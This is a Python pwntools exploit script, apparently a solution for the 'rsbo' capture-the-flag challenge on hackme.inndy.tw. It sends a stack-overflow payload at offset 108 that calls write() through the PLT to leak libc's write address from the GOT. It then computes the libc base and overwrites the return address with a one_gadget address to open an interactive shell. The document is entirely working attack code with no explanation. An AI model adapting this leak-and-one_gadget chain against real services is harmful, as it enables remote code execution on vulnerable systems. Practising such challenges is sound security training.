from pwn import *
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])

target = remote('hackme.inndy.tw', 7706)
libc = ELF('./libc-2.23.so.i386')
elf = ELF('./rsbo-01c51ca9a7b9db3d69289c6dbb1cd758')
plt_write = elf.symbols['write']
got_write = elf.got['write']
ret_addr = elf.symbols['_start']
payload = fit({108:[p32(plt_write), p32(ret_addr), p32(1), p32(got_write), p32(4)]},filler = "\x00")
target.send(payload)
write_addr = u32(target.recv(4))
libc_base = write_addr - libc.symbols['write']
one_gadget = 0x5faa5
magic = libc_base + one_gadget

payload = fit({108:[p32(magic)]},filler = '\x00')	
target.send(payload)
target.interactive()